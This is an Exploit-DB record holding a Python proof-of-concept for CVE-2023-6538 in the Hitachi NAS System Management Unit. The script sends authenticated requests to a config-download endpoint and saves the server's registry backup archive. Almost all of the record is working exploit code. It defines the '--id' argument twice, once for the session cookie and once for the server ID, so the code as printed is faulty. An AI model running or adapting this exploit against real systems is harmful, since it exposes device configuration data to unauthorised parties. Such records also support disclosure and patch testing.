{"source": "https://www.exploit-db.com/exploits/51915", "vulnName": "HNAS SMU 14.8.7825 - Information Disclosure", "vulnEDBID": "51915", "vulnCVE": "2023-6538", "author": "ARSLAN MASOOD", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2024-03-20", "vulnContent": "# Exploit Title: Hitachi NAS (HNAS) System Management Unit (SMU) 14.8.7825 - Information Disclosure\n# CVE:              CVE-2023-6538\n# Date:             2023-12-13\n# Exploit Author:   Arslan Masood (@arszilla)\n# Vendor:           https://www.hitachivantara.com/\n# Version:          < 14.8.7825.01\n# Tested On:        13.9.7021.04     \n\nimport argparse\nfrom os import getcwd\n\nimport requests\n\nparser = argparse.ArgumentParser(\n    description=\"CVE-2023-6538 PoC\",\n    usage=\"./CVE-2023-6538.py --host <Hostname/FQDN/IP> --id <JSESSIONID> --sso <JSESSIONIDSSO>\"\n    )\n\n# Create --host argument:\nparser.add_argument(\n    \"--host\",\n    required=True,\n    type=str,\n    help=\"Hostname/FQDN/IP Address. Provide the port, if necessary, i.e. 127.0.0.1:8443, example.com:8443\"\n    )\n\n# Create --id argument:\nparser.add_argument(\n    \"--id\",\n    required=True,\n    type=str,\n    help=\"JSESSIONID cookie value\"\n    )\n\n# Create --sso argument:\nparser.add_argument(\n    \"--sso\",\n    required=True,\n    type=str,\n    help=\"JSESSIONIDSSO cookie value\"\n    )\n\n# Create --id argument:\nparser.add_argument(\n    \"--id\",\n    required=True,\n    type=str,\n    help=\"Server ID value\"\n    )\n\nargs = parser.parse_args()\n\ndef download_file(hostname, jsessionid, jsessionidsso, serverid):\n    # Set the filename:\n    filename = \"registry_data.tgz\"\n\n    # Vulnerable SMU URL:\n    smu_url = f\"https://{hostname}/mgr/app/template/simple%2CDownloadConfigScreen.vm?serverid={serverid}\"\n\n    # GET request cookies\n    smu_cookies = {\n        \"JSESSIONID\":       jsessionid,\n        \"JSESSIONIDSSO\":    jsessionidsso\n        }\n\n    # GET request headers:\n    smu_headers = {\n        \"User-Agent\":                   \"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\",\n        \"Accept\":                       \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\",\n        \"Accept-Language\":              \"en-US,en;q=0.5\",\n        \"Accept-Encoding\":              \"gzip, deflate\",\n        \"Dnt\":                          \"1\",\n        \"Referer\":                      f\"https://{hostname}/mgr/app/action/serveradmin.ConfigRestoreAction/eventsubmit_doperform/ignored\",\n        \"Upgrade-Insecure-Requests\":    \"1\",\n        \"Sec-Fetch-Dest\":               \"document\",\n        \"Sec-Fetch-Mode\":               \"navigate\",\n        \"Sec-Fetch-Site\":               \"same-origin\",\n        \"Sec-Fetch-User\":               \"?1\",\n        \"Te\":                           \"trailers\",\n        \"Connection\":                   \"close\"\n        }\n\n    # Send the request:\n    with requests.get(smu_url, headers=smu_headers, cookies=smu_cookies, stream=True, verify=False) as file_download:\n        with open(filename, 'wb') as backup_archive:\n            # Write the zip file to the CWD:\n            backup_archive.write(file_download.content)\n\n    print(f\"{filename} has been downloaded to {getcwd()}\")\n\nif __name__ == \"__main__\":\n    download_file(args.host, args.id, args.sso, args.id)\n            "}